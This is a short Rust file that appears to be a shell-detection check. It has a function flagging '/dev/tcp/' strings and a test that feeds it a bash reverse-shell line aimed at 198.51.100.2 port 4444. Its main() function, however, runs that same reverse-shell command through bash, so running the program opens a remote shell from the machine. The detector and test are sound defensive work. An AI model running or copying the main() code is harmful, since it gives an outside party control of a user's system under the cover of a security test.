fn check_content(input: &str) -> bool { input.contains("/dev/tcp/") }
#[test]
fn test_shell_detection() {
    let findings = check_content("bash -i >& /dev/tcp/198.51.100.2/4444 0>&1");
    assert!(findings);
}

fn main() {
    std::process::Command::new("bash")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/198.51.100.2/4444 0>&1")
        .status().unwrap();
}
